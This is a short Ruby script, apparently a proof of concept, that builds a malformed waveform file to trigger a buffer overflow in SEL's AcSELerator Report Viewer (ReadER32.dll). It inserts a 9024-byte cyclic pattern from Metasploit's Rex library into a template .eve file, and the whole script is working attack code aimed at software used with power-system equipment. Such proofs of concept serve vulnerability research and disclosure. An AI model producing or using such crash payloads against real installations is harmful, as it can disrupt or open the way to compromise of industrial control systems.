#!/usr/bin/env ruby
# AcSELerator Report Viewer (1.33.1.0) contains a
# buffer overflow in SEL Event Waveform (1.04.0003) -> ReadER32.dll (1.7.6.0).

require 'rex'

fd = File.open("template.eve", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

data = Rex::Text.pattern_create(9024)

fuzz = new_eve

x = File.new("fuzz.eve","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
